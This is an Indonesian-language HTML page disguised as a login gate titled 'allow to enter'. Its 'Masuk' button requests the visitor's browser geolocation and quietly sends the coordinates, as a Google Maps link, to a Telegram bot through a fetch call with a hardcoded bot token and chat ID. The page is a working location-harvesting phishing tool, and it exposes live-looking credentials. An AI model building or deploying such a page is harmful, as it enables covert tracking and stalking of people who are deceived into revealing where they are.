<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>izinkan untuk masuk</title>
<style>
    body {
        font-family: 'Poppins', sans-serif;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        height: 100vh;
        margin: 0;
        background: #1e1e2f;
        color: #fff;
    }

    h2 {
        margin-bottom: 20px;
    }

    #sendLocationBtn {
        background: #4caf50;
        border: none;
        padding: 15px 30px;
        font-size: 16px;
        border-radius: 8px;
        cursor: pointer;
        transition: 0.3s;
        position: relative;
        overflow: hidden;
    }

    #sendLocationBtn:hover {
        background: #45a049;
    }

    #status {
        margin-top: 20px;
        font-size: 14px;
        min-height: 20px;
        text-align: center;
    }

    /* Loading Dots */
    .dots span {
        display: inline-block;
        width: 8px;
        height: 8px;
        margin: 0 2px;
        background: #fff;
        border-radius: 50%;
        animation: bounce 1s infinite;
    }

    .dots span:nth-child(2) { animation-delay: 0.2s; }
    .dots span:nth-child(3) { animation-delay: 0.4s; }

    @keyframes bounce {
        0%, 80%, 100% { transform: scale(0); }
        40% { transform: scale(1); }
    }
</style>
</head>
<body>
<h2>Izin kan untuk masuk</h2>
<button id="sendLocationBtn">Masuk</button>
<div id="status"></div>

<script>
const btn = document.getElementById('sendLocationBtn');
const status = document.getElementById('status');

btn.addEventListener('click', () => {
    status.innerHTML = 'Meminta lokasi <span class="dots"><span></span><span></span><span></span></span>';
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendLocation, showError);
    } else {
        status.textContent = "Geolokasi tidak didukung oleh browser ini.";
    }
});

function sendLocation(position) {
    const lat = position.coords.latitude;
    const lon = position.coords.longitude;

    const botToken = "8325820487:AAFiZj0q1hr5YpEm8yT1O-gl6vq-b8X5Kj8"; // Ganti dengan token bot Anda
    const chatId = "7719159066"; // Ganti dengan chat ID Anda
    const message = `üìç Lokasi pengguna: https://www.google.com/maps?q=${lat},${lon}`;

    status.innerHTML = 'Mengirim lokasi <span class="dots"><span></span><span></span><span></span></span>';

    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: message })
    })
    .then(response => response.json())
    .then(data => {
        if(data.ok){
            status.textContent = '‚úÖ Lokasi berhasil dikirim!';
        } else {
            status.textContent = '‚ùå Gagal mengirim lokasi!';
        }
    })
    .catch(error => {
        console.error(error);
        status.textContent = '‚ùå Terjadi kesalahan saat mengirim lokasi.';
    });
}

function showError(error) {
    switch(error.code) {
        case error.PERMISSION_DENIED:
            status.textContent = "‚ùå Pengguna menolak permintaan lokasi.";
            break;
        case error.POSITION_UNAVAILABLE:
            status.textContent = "‚ùå Informasi lokasi tidak tersedia.";
            break;
        case error.TIMEOUT:
            status.textContent = "‚ùå Permintaan lokasi habis waktu.";
            break;
        case error.UNKNOWN_ERROR:
            status.textContent = "‚ùå Terjadi kesalahan lokasi yang tidak diketahui.";
            break;
    }
}
</script>
</body>
</html>
